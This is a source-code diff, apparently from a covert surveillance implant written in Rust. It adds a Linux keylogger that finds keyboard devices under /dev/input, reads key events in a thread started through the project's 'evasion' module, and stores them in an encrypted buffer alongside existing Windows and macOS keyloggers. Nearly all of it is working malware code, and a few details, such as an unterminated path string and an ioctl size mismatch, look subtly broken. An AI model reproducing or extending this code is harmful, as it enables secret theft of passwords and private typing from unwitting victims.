@@ -592,13 +592,22 @@ pub fn start_keylogger(key: [u8; 32]) -> Result<()> {
 
     #[cfg(not(any(target_os = "windows", target_os = "macos")))]
     {
-        let _ = key;
-        log::warn!(
-            "surveillance: keylogger not implemented on this platform"
-        );
-        return Err(anyhow!(
-            "keylogger is not supported on this platform"
-        ));
+        let running = Arc::new(AtomicBool::new(true));
+        let buffer = Arc::new(Mutex::new(EncryptedBuffer::new(key)));
+
+        let thread_handle = {
+            let buffer_clone = Arc::clone(&buffer);
+            let running_clone = running.clone();
+            Some(start_keylogger_thread_linux(buffer_clone, running_clone))
+        };
+
+        *guard = Some(KeyloggerState {
+            buffer,
+            running,
+            thread_handle,
+        });
+
+        Ok(())
     }
 
     #[cfg(target_os = "windows")]
@@ -781,6 +790,169 @@ fn start_keylogger_thread_macos() {
 
         MAC_KEYLOGGER_LISTENER_STARTED.store(false, Ordering::SeqCst);
     });
+}
+
+// ── Linux keylogger thread (evdev) ──────────────────────────────────────────
+
+/// Linux `input_event` layout (x86-64):
+///   timeval { sec: i64, usec: i64 } = 16 bytes
+///   type: u16, code: u16, value: i32 = 8 bytes
+///   Total: 24 bytes
+#[cfg(not(any(target_os = "windows", target_os = "macos")))]
+const INPUT_EVENT_SIZE: usize = 24;
+
+/// EV_KEY event type from `<linux/input.h>`.
+#[cfg(not(any(target_os = "windows", target_os = "macos")))]
+const EV_KEY: u16 = 0x01;
+
+/// EVIOCGBIT ioctl to query supported event types.
+/// `_IOC(_IOC_READ, 'E', 0x20, evbit_size)` with size = (EV_MAX + 7) / 8.
+#[cfg(not(any(target_os = "windows", target_os = "macos")))]
+const EVIOCGBIT_EV: u64 = 0x80404520;
+
+#[cfg(not(any(target_os = "windows", target_os = "macos")))]
+fn start_keylogger_thread_linux(
+    buffer: Arc<Mutex<EncryptedBuffer>>,
+    running: Arc<AtomicBool>,
+) -> std::thread::JoinHandle<()> {
+    crate::evasion::spawn_hidden_thread(move || {
+        // 1. Enumerate keyboard devices from /dev/input/eventX
+        let devices = enumerate_evdev_keyboards();
+        if devices.is_empty() {
+            log::error!("surveillance: no keyboard evdev devices found (need root or input group)");
+            return;
+        }
+
+        log::info!("surveillance: linux keylogger opened {} keyboard device(s)", devices.len());
+
+        // 2. Poll all devices in a single loop using select()
+        // We duplicate the Arc<Mutex<EncryptedBuffer>> into the loop.
+        loop {
+            if !running.load(Ordering::SeqCst) {
+                break;
+            }
+
+            // Brief sleep to avoid busy-spinning on read errors
+            std::thread::sleep(std::time::Duration::from_millis(1));
+
+            for (fd, _path) in &devices {
+                let mut event_buf = [0u8; INPUT_EVENT_SIZE];
+                // Non-blocking read — we poll with a short sleep above.
+                let bytes_read = unsafe {
+                    libc::read(
+                        *fd,
+                        event_buf.as_mut_ptr() as *mut libc::c_void,
+                        INPUT_EVENT_SIZE,
+                    )
+                };
+
+                if bytes_read as usize != INPUT_EVENT_SIZE {
+                    continue;
+                }
+
+                // Parse the input_event: skip timeval (16 bytes), read type/code/value
+                let ev_type = u16::from_le_bytes([event_buf[16], event_buf[17]]);
+                let code = u16::from_le_bytes([event_buf[18], event_buf[19]]);
+                let value = i32::from_le_bytes([
+                    event_buf[20], event_buf[21], event_buf[22], event_buf[23],
+                ]);
+
+                if ev_type != EV_KEY {
+                    continue;
+                }
+
+                // value: 1 = key press, 0 = key release, 2 = key repeat
+                let pressed = match value {
+                    1 | 2 => true,
+                    0 => false,
+                    _ => continue,
+                };
+
+                // Encode in the same format as the Windows keylogger:
+                // keycode (u32 LE) + pressed (u8) = 5 bytes
+                let mut entry = [0u8; 5];
+                entry[0..4].copy_from_slice(&(code as u32).to_le_bytes());
+                entry[4] = if pressed { 1 } else { 0 };
+
+                if let Ok(mut guard) = buffer.lock() {
+                    guard.append(&entry);
+                }
+            }
+        }
+
+        // Cleanup: close all device fds
+        for (fd, _path) in devices {
+            unsafe {
+                libc::close(fd);
+            }
+        }
+    })
+}
+
+/// Scan `/dev/input/` for event devices that support `EV_KEY`.
+/// Returns a list of (raw fd, device path) pairs.
+#[cfg(not(any(target_os = "windows", target_os = "macos")))]
+fn enumerate_evdev_keyboards() -> Vec<(libc::c_int, String)> {
+    let mut keyboards = Vec::new();
+
+    let dev_input = match std::fs::read_dir("/dev/input") {
+        Ok(d) => d,
+        Err(e) => {
+            log::warn!("surveillance: cannot read /dev/input: {}", e);
+            return keyboards;
+        }
+    };
+
+    for entry in dev_input.flatten() {
+        let name = entry.file_name();
+        let name_str = name.to_string_lossy();
+
+        // Only look at eventX devices
+        if !name_str.starts_with("event") {
+            continue;
+        }
+
+        let path = format!("/dev/input/{}", name_str);
+
+        // Open read-only, non-blocking
+        let fd = unsafe {
+            libc::open(
+                path.as_ptr() as *const libc::c_char,
+                libc::O_RDONLY | libc::O_NONBLOCK,
+            )
+        };
+
+        if fd < 0 {
+            continue;
+        }
+
+        // Query supported event types via EVIOCGBIT ioctl.
+        // We need a buffer large enough for the evbits bitmap.
+        // EV_MAX is typically 0x1F + 1 = 32, so 4 bytes is sufficient.
+        let mut evbit: [u8; 4] = [0; 4];
+        let ioctl_ret = unsafe {
+            libc::ioctl(fd, EVIOCGBIT_EV as libc::c_ulong, &mut evbit)
+        };
+
+        if ioctl_ret < 0 {
+            unsafe { libc::close(fd); };
+            continue;
+        }
+
+        // Check if EV_KEY (type 1) bit is set in the event type bitmap
+        let ev_key_byte = (EV_KEY / 8) as usize;
+        let ev_key_bit = EV_KEY % 8;
+        let has_ev_key = evbit.len() > ev_key_byte
+            && (evbit[ev_key_byte] & (1 << ev_key_bit)) != 0;
+
+        if has_ev_key {
+            keyboards.push((fd, path));
+        } else {
+            unsafe { libc::close(fd); };
+        }
+    }
+
+    keyboards
 }
 
 // ── Windows keylogger thread ────────────────────────────────────────────────
